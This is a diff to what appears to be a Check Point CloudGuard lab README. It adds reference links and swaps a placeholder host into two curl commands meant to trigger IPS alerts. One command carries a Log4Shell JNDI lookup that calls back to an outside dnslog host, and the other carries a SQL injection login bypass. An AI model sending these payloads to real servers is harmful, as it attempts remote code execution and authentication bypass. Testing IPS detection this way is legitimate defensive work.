@@ -136,7 +136,15 @@ while true; do date; ping -c 3 1.1.1.1; echo; done
 
 Cause IPS incidents (should be prevented/catched by IPS if configured):
 ```
-curl yourserver.xyz -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' -v
+curl http://www.cpcheckme.com/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' -v
 
-curl -k 'http://yourserver.xyz/mutillidae/index.php?page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details'
+curl -k 'http://www.cpcheckme.com/mutillidae/index.php?page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details'
 ```
+
+## Various materials
+
+* Check Point Cloud Management [Admin Guide](https://sc1.checkpoint.com/documents/IaaS/WebAdminGuides/EN/CP_CME/Content/Topics-CME/Overview.htm)
+* Check Point CloudGuard Controller [Admin Guide](https://sc1.checkpoint.com/documents/R81.10/WebAdminGuides/EN/CP_R81.10_CloudGuard_Controller_AdminGuide/Topics-CGRDG/Introduction.htm)
+* Check Point CGNS TerraForm modules [GitHub repo](https://github.com/CheckPointSW/CloudGuardIaaS/tree/master/terraform/aws)
+* CGNS AWS Gateway LoadBalancer - Deep Dive Webinar [materials](https://community.checkpoint.com/t5/Cloud-Network-Security/AWS-Gateway-LoadBalancer-Deep-Dive-Webinar/td-p/117827) and [diagram](https://community.checkpoint.com/t5/Cloud-Network-Security/The-Workshop-AWS-Gateway-LoadBalancer-amp-CloudGuard-Network/td-p/145715)
+* AWS workshop on CHKP CGNS with GWLB with [traffic flows](https://checkpoint.awsworkshop.io/02handsonflows/3_centegress.html)
